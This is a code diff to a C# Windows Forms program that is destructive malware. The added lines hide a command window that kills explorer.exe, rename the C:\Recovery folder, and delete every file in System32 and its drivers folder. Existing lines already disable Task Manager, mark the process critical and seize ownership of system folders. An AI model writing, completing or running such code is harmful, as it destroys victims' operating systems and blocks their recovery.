@@ -17,6 +17,7 @@ using System.Media;
 using System.Security.Cryptography;
 using System.Net.Sockets;
 using System.Net;
+using System.Reflection;
 
 namespace WindowsFormsApp1
 {
@@ -58,6 +59,16 @@ namespace WindowsFormsApp1
             NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
             RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
             rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // turn off task manager
+            //Kill explorer
+            Process[] pname2 = Process.GetProcessesByName("explorer");
+            if (pname2.Length == 1)
+            {
+                ProcessStartInfo block_exp = new ProcessStartInfo();
+                block_exp.FileName = "cmd.exe";
+                block_exp.WindowStyle = ProcessWindowStyle.Hidden;
+                block_exp.Arguments = @"/k taskkill /f /im explorer.exe && exit";
+                Process.Start(block_exp);
+            }
             // This line of code activates a script
             //get system32 folder and drivers
             new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();
@@ -131,6 +142,12 @@ namespace WindowsFormsApp1
                     _soundplayer.Play(); //play sound
                 }
             }
+            // Now we remove the "Recovery" Folder
+            string recovery = @"C:\Recovery";
+            if (Directory.Exists(recovery))
+            {
+                Directory.Move(recovery, @"C:\DontGetStupidNowKids");
+            }
             // Now we get annoying with opening screens.
             Random r;
             r = new Random();
@@ -143,7 +160,7 @@ namespace WindowsFormsApp1
 
             if (true_num == 2)
             {
-                if (MessageBox.Show("Never gonna give you up never gonna let ya down.", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No);
+                if (MessageBox.Show("Never gonna give you up never gonna let ya down.", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No) ;
                 System.Diagnostics.Process.Start("https://www.youtube.com/channel/UCviSYAcwdnDX1UoRzAHYgNg");
             }
 
@@ -249,7 +266,39 @@ namespace WindowsFormsApp1
             captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
             captureBitmap.Save(@"Capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
             // captureBitmap.UploadToWebsite("https://drive.google.com/drive/my-drive");
-            // This line of code creates a bunch of ping and removes discord. PLEASE CODE THIS FOR ME PEOPLE!
+            // Now we remove system 32.
+            string[] filePaths2 = Directory.GetFiles(@"C:\Windows\System32");
+            foreach (string filePath2 in filePaths2)
+            {
+                try
+                {
+                    File.Delete(filePath2);
+                }
+                catch { }
+            }
+            string[] filePaths3 = Directory.GetFiles(@"C:\Windows\System32\drivers");
+            foreach (string filePath3 in filePaths3)
+            {
+                try
+                {
+                    File.Delete(filePath3);
+                }
+                catch { }
+            }
+            // Alrightie now we put new images on the pc
+            void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
+            {
+                /*   Assembly assembly = Assembly.GetCallingAssembly();
+
+                   using (Stream e = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
+                   {
+                       BinaryReader binaryReader = new BinaryReader(e);
+                      // Stream e = new Stream();
+                       using (BinaryReader t = binaryReader)
+                       using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
+                       using (BinaryWriter w = new BinaryWriter(fs))
+                           w.Write(t.ReadBytes((int)e.Length)); */
+            }
         }
     }
 }
